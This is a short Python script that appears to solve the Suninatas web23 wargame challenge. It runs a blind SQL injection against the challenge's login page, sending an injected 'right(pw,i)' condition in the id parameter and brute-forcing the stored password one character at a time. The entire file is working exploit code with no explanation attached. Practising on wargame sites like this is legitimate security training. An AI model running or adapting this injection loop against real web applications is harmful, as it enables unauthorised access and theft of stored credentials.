import requests
pw = ""

url = "http://suninatas.com/challenge/web23/web23.asp"
for i in range(1,13):
    for j in range(33,128):
        r = requests.get(url,params={"id" : f"'or+right(pw,{i})='{chr(j)+pw}'--", "pw" : "1"})
        if r.text.find("OK") != -1:
            pw += chr(j)
            print(f"password {i} is {chr(j)}")
            break

print(f"password : {pw}")
